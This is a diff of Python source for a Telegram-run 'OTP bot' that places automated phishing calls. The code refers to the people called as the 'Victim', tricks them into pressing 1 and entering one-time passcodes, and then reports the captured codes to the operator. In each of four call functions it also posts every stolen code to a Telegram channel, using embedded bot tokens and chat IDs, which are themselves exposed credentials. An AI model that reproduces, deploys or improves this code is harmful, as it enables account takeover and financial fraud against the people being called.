@@ -1139,13 +1139,13 @@ def custom_prebuild_script_call(script_id,chatid):
         finally:
             global last_message_ids
             if call_cause  == "Unknown":
-                 mes = "Call Ended☎️"
+                 mes = "Call Ended🛑"
             elif call_cause == "Circuit/channel congestion":
                  mes = "Call ended due to API issue ⚙️"
             elif call_cause == "Normal Clearing":
-                 mes = "Call Ended by Victim ☎️"
+                 mes = "Call Ended by Victim 🛑"
             else:
-                 mes =  " Call Ended ☎️ "
+                 mes =  " Call Ended 🛑 "
             mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
@@ -1181,7 +1181,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -1197,7 +1197,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 {otp2} ✅*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1205,7 +1205,7 @@ def custom_prebuild_script_call(script_id,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown')
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1325,13 +1325,13 @@ def prebuild_script_call(service,chatid):
         finally:
             global last_message_ids
             if call_cause  == "Unknown":
-                 mes = "Call Ended ☎️"
+                 mes = "Call Ended 🛑"
             elif call_cause == "Circuit/channel congestion":
                  mes = "Call ended due to API issue ⚙️"
             elif call_cause == "Normal Clearing":
-                 mes = "Call Ended by Victim ☎️"
+                 mes = "Call Ended by Victim 🛑"
             else:
-                 mes =  " Call Ended ☎️ "
+                 mes =  " Call Ended 🛑 "
 
             mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
@@ -1370,7 +1370,7 @@ def prebuild_script_call(service,chatid):
                 requests.post(url3, json=data)
 
             def send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
             bgtask2 = threading.Thread(target=ask_otp)
             bgtask2.start()
             send_ask_otp()
@@ -1385,7 +1385,7 @@ def prebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 {otp2} ✅*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1393,7 +1393,7 @@ def prebuild_script_call(service,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1526,7 +1526,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
             print("No Audio File")
         finally:
             global last_message_ids
-            mes =  " Call Ended ☎️ "
+            mes =  " Call Ended 🛑 "
 
             mesid = bot.send_message(chatid,f"""*{mes}\nMake call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
@@ -1557,7 +1557,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -1574,7 +1574,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 {otp2} ✅*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1582,7 +1582,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown')
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1705,7 +1705,7 @@ def tprebuild_script_call(service,chatid):
             print("No Audio File")
         finally:
             global last_message_ids
-            mes =  " Call Ended ☎️ "
+            mes =  " Call Ended 🛑 "
  
             mesid = bot.send_message(chatid,f"""*{mes}\n Make call again - /recall*""", parse_mode='Markdown').message_id
             last_message_ids[chatid]=mesid
@@ -1739,7 +1739,7 @@ def tprebuild_script_call(service,chatid):
                 requests.post(url3, json=data)
 
             def send_ask_otp(): 
-                bot.send_message(chatid,f"""*1 Pressed....Sending OTP Now 🔂*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*The Victim Pressed 1.🦧 Send OTP Now📲*""",parse_mode='markdown')
             bgtask2 = threading.Thread(target=ask_otp)
             bgtask2.start()
             send_ask_otp()
@@ -1755,7 +1755,7 @@ def tprebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*The captured OTP is {otp2} 🤖*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 {otp2} ✅*""",parse_mode='markdown')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1763,7 +1763,7 @@ def tprebuild_script_call(service,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully ✅*", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7091717691:AAGV5CneUzj4ljKHf0Ov7rWwS9tAhf8t53A/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
